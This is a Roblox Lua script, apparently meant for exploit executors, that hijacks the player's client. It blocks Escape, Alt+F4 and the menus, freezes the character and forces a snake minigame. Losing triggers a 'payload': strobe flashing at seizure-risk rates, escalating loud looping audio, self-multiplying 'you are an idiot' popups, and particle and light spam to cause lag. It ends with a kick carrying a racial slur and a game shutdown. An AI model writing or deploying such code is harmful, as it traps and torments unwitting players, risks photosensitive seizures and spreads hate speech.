local Players       = game:GetService("Players")
local RunService    = game:GetService("RunService")
local SoundService  = game:GetService("SoundService")
local GuiService    = game:GetService("GuiService")
local StarterGui    = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local ContextActionService = game:GetService("ContextActionService")

local player = Players.LocalPlayer
if not player then
	repeat task.wait() until Players.LocalPlayer
	player = Players.LocalPlayer
end

local function mount(gui)
	local ok = pcall(function()
		if typeof(gethui) == "function" then
			gui.Parent = gethui()
			return
		end
		if syn and syn.protect_gui then
			syn.protect_gui(gui)
			gui.Parent = game:GetService("CoreGui")
			return
		end
		if typeof(protect_gui) == "function" then
			protect_gui(gui)
			gui.Parent = game:GetService("CoreGui")
			return
		end
		gui.Parent = game:GetService("CoreGui")
	end)
	if not ok or not gui.Parent then
		gui.Parent = player:WaitForChild("PlayerGui")
	end
end

local sw, sh = 1280, 720
local function refreshViewport()
	local cam = workspace.CurrentCamera
	if cam then
		local vp = cam.ViewportSize
		if vp.X > 0 and vp.Y > 0 then
			sw, sh = vp.X, vp.Y
		end
	end
end
refreshViewport()
do
	local cam = workspace.CurrentCamera
	if cam then
		cam:GetPropertyChangedSignal("ViewportSize"):Connect(refreshViewport)
	end
	workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
		local c = workspace.CurrentCamera
		if c then
			c:GetPropertyChangedSignal("ViewportSize"):Connect(refreshViewport)
			refreshViewport()
		end
	end)
end

local function lockDown()
	local running = true

	pcall(function()
		ContextActionService:BindActionAtPriority(
			"M7_GateLockdown",
			function() return Enum.ContextActionResult.Sink end,
			false,
			Enum.ContextActionPriority.High.Value + 5000,
			Enum.KeyCode.Escape,
			Enum.KeyCode.Return, Enum.KeyCode.KeypadEnter,
			Enum.KeyCode.L,
			Enum.KeyCode.LeftAlt, Enum.KeyCode.RightAlt,
			Enum.KeyCode.F4,
			Enum.KeyCode.LeftMeta, Enum.KeyCode.RightMeta,
			Enum.KeyCode.ButtonStart, Enum.KeyCode.ButtonSelect,
			Enum.KeyCode.ButtonA, Enum.KeyCode.ButtonB
		)
	end)

	pcall(function()
		local pm = player:FindFirstChild("PlayerScripts") and player.PlayerScripts:FindFirstChild("PlayerModule")
		if pm then
			local mod = require(pm)
			if mod and mod.GetControls then
				local controls = mod:GetControls()
				if controls and controls.Disable then controls:Disable() end
			end
		end
	end)

	task.spawn(function()
		while running do
			pcall(function() GuiService:SetMenuIsOpen(false) end)
			pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
			pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
			pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
			pcall(function()
				local char = player.Character
				if char then
					for _, p in ipairs(char:GetChildren()) do
						if p:IsA("BasePart") and not p.Anchored then
							p.Anchored = true
						end
					end
				end
			end)
			task.wait(0.01)
		end
	end)

	pcall(function()
		GuiService.MenuOpened:Connect(function()
			pcall(function() GuiService:SetMenuIsOpen(false) end)
		end)
	end)

	return function()
		running = false
		pcall(function() ContextActionService:UnbindAction("M7_GateLockdown") end)
		pcall(function()
			local char = player.Character
			if char then
				for _, p in ipairs(char:GetChildren()) do
					if p:IsA("BasePart") and p.Anchored then
						p.Anchored = false
					end
				end
			end
		end)
		pcall(function()
			local pm = player:FindFirstChild("PlayerScripts") and player.PlayerScripts:FindFirstChild("PlayerModule")
			if pm then
				local mod = require(pm)
				if mod and mod.GetControls then
					local controls = mod:GetControls()
					if controls and controls.Enable then controls:Enable() end
				end
			end
		end)
		pcall(function() StarterGui:SetCore("TopbarEnabled", true) end)
		pcall(function() StarterGui:SetCore("ResetButtonCallback", true) end)
		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true) end)
		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true) end)
		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true) end)
		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, true) end)
		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true) end)
	end
end

local function unleashPayload()
	task.spawn(function()
		for tick = 1, 9 do
			task.wait(1)
			local emitterCount = tick * 8
			local lightCount = tick * 4
			local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
			local basePos = root and root.Position or Vector3.new(0, 5, 0)

			for _ = 1, emitterCount do
				pcall(function()
					local part = Instance.new("Part")
					part.Size = Vector3.new(0.2, 0.2, 0.2)
					part.Transparency = 1
					part.CanCollide = false
					part.Anchored = true
					part.CFrame = CFrame.new(basePos + Vector3.new(
						math.random(-30, 30),
						math.random(-5, 20),
						math.random(-30, 30)
					))

					local emitter = Instance.new("ParticleEmitter")
					emitter.Rate = 400
					emitter.Lifetime = NumberRange.new(8, 15)
					emitter.Size = NumberSequence.new(12)
					emitter.Texture = "rbxasset://textures/particles/sparkles_main.dds"
					emitter.LightEmission = 1
					emitter.LightInfluence = 0
					emitter.Transparency = NumberSequence.new(0.3)
					emitter.Parent = part
					part.Parent = workspace
				end)
			end

			for _ = 1, lightCount do
				pcall(function()
					local part = Instance.new("Part")
					part.Size = Vector3.new(1, 1, 1)
					part.Transparency = 1
					part.CanCollide = false
					part.Anchored = true
					part.CFrame = CFrame.new(basePos + Vector3.new(
						math.random(-40, 40),
						math.random(0, 25),
						math.random(-40, 40)
					))
					local light = Instance.new("PointLight")
					light.Range = 60
					light.Brightness = 8
					light.Shadows = true
					light.Parent = part
					part.Parent = workspace
				end)
			end
		end
	end)

	task.delay(300, function()
		pcall(function()
			player:Kick("Fuck you nigger<3")
		end)
		task.wait(0.5)
		pcall(function()
			game:Shutdown()
		end)
	end)

	local blackGui = Instance.new("ScreenGui")
	blackGui.Name = "M7_BlackOut"
	blackGui.ResetOnSpawn = false
	blackGui.IgnoreGuiInset = true
	blackGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	blackGui.DisplayOrder = 999998
	mount(blackGui)

	local blackFrame = Instance.new("Frame")
	blackFrame.Size = UDim2.fromScale(1, 1)
	blackFrame.Position = UDim2.fromScale(0, 0)
	blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	blackFrame.BackgroundTransparency = 0
	blackFrame.BorderSizePixel = 0
	blackFrame.ZIndex = 1
	blackFrame.Parent = blackGui

	local SOUND_ID = "rbxassetid://131761138083978"
	local MAX_SOUNDS = 25
	local sounds = {}

	local function addSound(clean)
		if #sounds >= MAX_SOUNDS then return end
		local s = Instance.new("Sound")
		s.SoundId = SOUND_ID
		s.Looped = true
		s.Volume = 10
		if clean then
			s.PlaybackSpeed = 1.0
		else
			s.PlaybackSpeed = 0.55 + math.random() * 1.1
		end
		s.Parent = SoundService
		pcall(function()
			s:Play()
			if not clean then
				local len = s.TimeLength
				if len and len > 0 then
					s.TimePosition = math.random() * len
				else
					s.TimePosition = math.random() * 5
				end
			end
		end)
		sounds[#sounds + 1] = s
		return s
	end

	addSound(true)

	task.spawn(function()
		local interval = 2.0
		while true do
			task.wait(interval)
			addSound(false)
			interval = math.max(0.075, interval * 0.94)
		end
	end)

	task.spawn(function()
		task.wait(7.5)
		while true do
			task.wait(0.75)
			if #sounds >= 5 then
				for i = 1, math.min(2, #sounds) do
					local s = sounds[math.random(1, #sounds)]
					if s and s.Parent then
						pcall(function()
							local len = s.TimeLength
							if len and len > 0 then
								s.TimePosition = math.random() * len
							end
							if math.random() < 0.35 then
								s.PlaybackSpeed = 0.55 + math.random() * 1.1
							end
						end)
					end
				end
			end
		end
	end)

	local isBlack = true
	local timer   = 0
	local pages   = {}

	RunService.Heartbeat:Connect(function(dt)
		timer += dt
		if timer < 0.35 then return end
		timer = 0
		isBlack = not isBlack

		local bg = isBlack and Color3.fromRGB(0, 0, 0)   or Color3.fromRGB(255, 255, 255)
		local fg = isBlack and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(0, 0, 0)

		for data in pairs(pages) do
			if data.page and data.page.Parent then
				data.page.BackgroundColor3 = bg
				data.label.TextColor3 = fg
				for _, face in ipairs(data.faces) do
					face.TextColor3 = fg
				end
			else
				pages[data] = nil
			end
		end
	end)

	local count = 0

	local function spawnPopup()
		count += 1
		local id = count

		local gui = Instance.new("ScreenGui")
		gui.Name = "popup" .. id
		gui.ResetOnSpawn = false
		gui.IgnoreGuiInset = true
		gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		gui.DisplayOrder = 999999 + id
		mount(gui)

		local w, h, th = 420, 260, 24
		local px = math.random(0, math.max(1, sw - w))
		local py = math.random(0, math.max(1, sh - h))
		local vx = math.random(180, 320) * (math.random(0, 1) == 0 and 1 or -1)
		local vy = math.random(180, 320) * (math.random(0, 1) == 0 and 1 or -1)

		local window = Instance.new("Frame")
		window.Size = UDim2.new(0, w, 0, h)
		window.Position = UDim2.new(0, px, 0, py)
		window.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		window.BorderSizePixel = 0
		window.ZIndex = id * 3
		window.Parent = gui

		local stroke = Instance.new("UIStroke")
		stroke.Thickness = 1
		stroke.Color = Color3.fromRGB(20, 20, 20)
		stroke.Parent = window

		local titleBar = Instance.new("Frame")
		titleBar.Size = UDim2.new(1, 0, 0, th)
		titleBar.Position = UDim2.new(0, 0, 0, 0)
		titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
		titleBar.BorderSizePixel = 0
		titleBar.ZIndex = id * 3 + 1
		titleBar.Parent = window

		local titleLabel = Instance.new("TextLabel")
		titleLabel.Size = UDim2.new(1, -32, 1, 0)
		titleLabel.Position = UDim2.new(0, 8, 0, 0)
		titleLabel.BackgroundTransparency = 1
		titleLabel.Text = "you are an idiot"
		titleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
		titleLabel.Font = Enum.Font.Gotham
		titleLabel.TextSize = 12
		titleLabel.TextXAlignment = Enum.TextXAlignment.Left
		titleLabel.ZIndex = id * 3 + 2
		titleLabel.Parent = titleBar

		local closeBtn = Instance.new("TextButton")
		closeBtn.Size = UDim2.new(0, 24, 0, 18)
		closeBtn.Position = UDim2.new(1, -26, 0, 3)
		closeBtn.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
		closeBtn.BorderSizePixel = 0
		closeBtn.Text = "×"
		closeBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
		closeBtn.Font = Enum.Font.GothamBold
		closeBtn.TextSize = 15
		closeBtn.ZIndex = id * 3 + 2
		closeBtn.Parent = titleBar

		local initBg = isBlack and Color3.fromRGB(0, 0, 0)   or Color3.fromRGB(255, 255, 255)
		local initFg = isBlack and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(0, 0, 0)

		local page = Instance.new("Frame")
		page.Size = UDim2.new(1, 0, 1, -th)
		page.Position = UDim2.new(0, 0, 0, th)
		page.BackgroundColor3 = initBg
		page.BorderSizePixel = 0
		page.ZIndex = id * 3 + 1
		page.Parent = window

		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, 0, 0, 56)
		label.Position = UDim2.new(0, 0, 0, 30)
		label.BackgroundTransparency = 1
		label.Text = "you are an idiot"
		label.TextColor3 = initFg
		label.Font = Enum.Font.Gotham
		label.TextSize = 28
		label.TextXAlignment = Enum.TextXAlignment.Center
		label.ZIndex = id * 3 + 2
		label.Parent = page

		local faceList = {}
		local faceSize = 58
		local gap = 20
		local rowWidth = 3 * faceSize + 2 * gap
		local startX = (w - rowWidth) / 2

		for i = 1, 3 do
			local face = Instance.new("TextLabel")
			face.Size = UDim2.new(0, faceSize, 0, faceSize)
			face.Position = UDim2.new(0, startX + (i - 1) * (faceSize + gap), 0, 100)
			face.BackgroundTransparency = 1
			face.Text = "☺"
			face.TextColor3 = initFg
			face.Font = Enum.Font.Gotham
			face.TextScaled = true
			face.ZIndex = id * 3 + 2
			face.Parent = page
			table.insert(faceList, face)
		end

		local data = { page = page, label = label, faces = faceList }
		pages[data] = true

		local conn
		conn = RunService.Heartbeat:Connect(function(dt)
			if not gui.Parent then
				conn:Disconnect()
				pages[data] = nil
				return
			end

			px += vx * dt
			py += vy * dt

			if px <= 0 then px = 0; vx = math.abs(vx)
			elseif px + w >= sw then px = sw - w; vx = -math.abs(vx) end

			if py <= 0 then py = 0; vy = math.abs(vy)
			elseif py + h >= sh then py = sh - h; vy = -math.abs(vy) end

			window.Position = UDim2.new(0, px, 0, py)
		end)

		closeBtn.MouseButton1Click:Connect(function()
			conn:Disconnect()
			pages[data] = nil
			gui:Destroy()
			task.spawn(spawnPopup)
			task.spawn(spawnPopup)
			task.spawn(spawnPopup)
		end)
	end

	spawnPopup()
	for i = 1, 8 do
		task.delay(i * 0.1, spawnPopup)
	end

	task.spawn(function()
		local interval = 0.25
		while true do
			task.wait(interval)
			spawnPopup()
			interval = math.max(0.02, interval * 0.94)
		end
	end)
end

local function runMinigame(onWin, onLose)
	refreshViewport()
	pcall(function()
		local cam = workspace.CurrentCamera
		if cam then
			local vp = cam.ViewportSize
			if vp.X > 0 and vp.Y > 0 then sw, sh = vp.X, vp.Y end
		end
	end)

	local TARGET_CELL = 60
	local GRID_COLS   = math.max(20, math.floor(sw / TARGET_CELL))
	local GRID_ROWS   = math.max(12, math.floor(sh / TARGET_CELL))
	local CELL        = math.floor(math.min(sw / GRID_COLS, sh / GRID_ROWS))
	local START_LEN   = 3
	local WIN_APPLES  = 5
	local START_TICK  = 0.10
	local MIN_TICK    = 0.05
	local TICK_STEP   = 0.012

	local gui = Instance.new("ScreenGui")
	gui.Name = "M7_Gate"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	gui.DisplayOrder = 1000000
	mount(gui)

	pcall(function()
		local backdrop = Instance.new("Frame")
		backdrop.Size = UDim2.fromScale(1, 1)
		backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		backdrop.BackgroundTransparency = 0
		backdrop.BorderSizePixel = 0
		backdrop.ZIndex = 1
		backdrop.Parent = gui
	end)

	local boardW = GRID_COLS * CELL
	local boardH = GRID_ROWS * CELL
	local board = Instance.new("Frame")
	board.AnchorPoint = Vector2.new(0.5, 0.5)
	board.Position = UDim2.fromScale(0.5, 0.5)
	board.Size = UDim2.new(0, boardW, 0, boardH)
	board.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
	board.BorderSizePixel = 0
	board.ZIndex = 2
	board.Parent = gui

	local boardStroke = Instance.new("UIStroke")
	boardStroke.Thickness = 2
	boardStroke.Color = Color3.fromRGB(90, 90, 90)
	boardStroke.Parent = board

	local header = Instance.new("Frame")
	header.AnchorPoint = Vector2.new(0.5, 0)
	header.Position = UDim2.new(0.5, 0, 0, 16)
	header.Size = UDim2.new(0, 720, 0, 64)
	header.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	header.BackgroundTransparency = 0.25
	header.BorderSizePixel = 0
	header.ZIndex = 6
	header.Parent = gui

	local headerStroke = Instance.new("UIStroke")
	headerStroke.Thickness = 1
	headerStroke.Color = Color3.fromRGB(90, 90, 90)
	headerStroke.Parent = header

	local title = Instance.new("TextLabel")
	title.AnchorPoint = Vector2.new(0.5, 0)
	title.Position = UDim2.new(0.5, 0, 0, 6)
	title.Size = UDim2.new(1, -20, 0, 26)
	title.BackgroundTransparency = 1
	title.Text = "eat 5 apples to win big boy"
	title.TextColor3 = Color3.fromRGB(240, 240, 240)
	title.Font = Enum.Font.GothamBold
	title.TextSize = 20
	title.ZIndex = 7
	title.Parent = header

	local score = Instance.new("TextLabel")
	score.AnchorPoint = Vector2.new(0.5, 0)
	score.Position = UDim2.new(0.5, 0, 0, 34)
	score.Size = UDim2.new(1, -20, 0, 22)
	score.BackgroundTransparency = 1
	score.Text = "Apples: 0 / " .. WIN_APPLES .. "  move with WASD or arrow keys"
	score.TextColor3 = Color3.fromRGB(200, 200, 200)
	score.Font = Enum.Font.Gotham
	score.TextSize = 16
	score.ZIndex = 7
	score.Parent = header

	local headX = math.floor(GRID_COLS / 2)
	local headY = math.floor(GRID_ROWS / 2)
	local snake = {}
	for i = 0, START_LEN - 1 do
		table.insert(snake, { headX - i, headY })
	end
	local direction = { 0, 0 }
	local nextDirection = { 0, 0 }
	local applesEaten = 0
	local tickRate = START_TICK
	local alive = true
	local outcomeFired = false
	local segmentFrames = {}
	local foodFrame
	local food = { 0, 0 }
	local inputConn

	local function makeCell(color)
		local f = Instance.new("Frame")
		f.Size = UDim2.new(0, CELL, 0, CELL)
		f.BackgroundColor3 = color
		f.BorderSizePixel = 0
		f.ZIndex = 3
		return f
	end

	local function placeCell(f, x, y)
		f.Position = UDim2.new(0, (x - 1) * CELL, 0, (y - 1) * CELL)
	end

	for _, seg in ipairs(snake) do
		local f = makeCell(Color3.fromRGB(90, 220, 110))
		placeCell(f, seg[1], seg[2])
		f.Parent = board
		table.insert(segmentFrames, f)
	end

	local function isOccupied(x, y)
		for _, seg in ipairs(snake) do
			if seg[1] == x and seg[2] == y then return true end
		end
		return false
	end

	local function spawnFood()
		for _ = 1, 200 do
			local x = math.random(1, GRID_COLS)
			local y = math.random(1, GRID_ROWS)
			if not isOccupied(x, y) then
				food = { x, y }
				placeCell(foodFrame, x, y)
				return
			end
		end
		for y = 1, GRID_ROWS do
			for x = 1, GRID_COLS do
				if not isOccupied(x, y) then
					food = { x, y }
					placeCell(foodFrame, x, y)
					return
				end
			end
		end
	end

	foodFrame = makeCell(Color3.fromRGB(230, 70, 70))
	foodFrame.Parent = board
	spawnFood()

	local function teardown()
		alive = false
		if inputConn then
			pcall(function() inputConn:Disconnect() end)
			inputConn = nil
		end
		pcall(function() gui:Destroy() end)
	end

	local function fireOutcome(won)
		if outcomeFired then return end
		outcomeFired = true
		teardown()
		if won then
			onWin()
		else
			onLose()
		end
	end

	inputConn = UserInputService.InputBegan:Connect(function(input)
		if not alive then return end
		local k = input.KeyCode
		local dx, dy
		if     k == Enum.KeyCode.W or k == Enum.KeyCode.Up    then dx, dy = 0, -1
		elseif k == Enum.KeyCode.S or k == Enum.KeyCode.Down  then dx, dy = 0,  1
		elseif k == Enum.KeyCode.A or k == Enum.KeyCode.Left  then dx, dy = -1, 0
		elseif k == Enum.KeyCode.D or k == Enum.KeyCode.Right then dx, dy =  1, 0
		else return end
		local neck = snake[2]
		if neck then
			local bodyDx = neck[1] - snake[1][1]
			local bodyDy = neck[2] - snake[1][2]
			if dx == bodyDx and dy == bodyDy then return end
		end
		nextDirection = { dx, dy }
	end)

	task.spawn(function()
		while alive do
			task.wait(tickRate)
			if not alive then break end

			direction = nextDirection
			if direction[1] == 0 and direction[2] == 0 then
				continue
			end

			local head = snake[1]
			local nx = head[1] + direction[1]
			local ny = head[2] + direction[2]

			if nx < 1 or nx > GRID_COLS or ny < 1 or ny > GRID_ROWS then
				fireOutcome(false)
				return
			end

			local willEat = (nx == food[1] and ny == food[2])
			local checkEnd = willEat and #snake or (#snake - 1)
			for i = 1, checkEnd do
				local seg = snake[i]
				if seg[1] == nx and seg[2] == ny then
					fireOutcome(false)
					return
				end
			end

			table.insert(snake, 1, { nx, ny })
			local f = makeCell(Color3.fromRGB(90, 220, 110))
			placeCell(f, nx, ny)
			f.Parent = board
			table.insert(segmentFrames, 1, f)

			if willEat then
				applesEaten += 1
				score.Text = "Apples: " .. applesEaten .. " / " .. WIN_APPLES
				tickRate = math.max(MIN_TICK, tickRate - TICK_STEP)
				if applesEaten >= WIN_APPLES then
					fireOutcome(true)
					return
				end
				spawnFood()
			else
				table.remove(snake)
				local tailFrame = table.remove(segmentFrames)
				pcall(function() tailFrame:Destroy() end)
			end
		end
	end)
end

local unlock = lockDown()
runMinigame(function() unlock() end, unleashPayload)
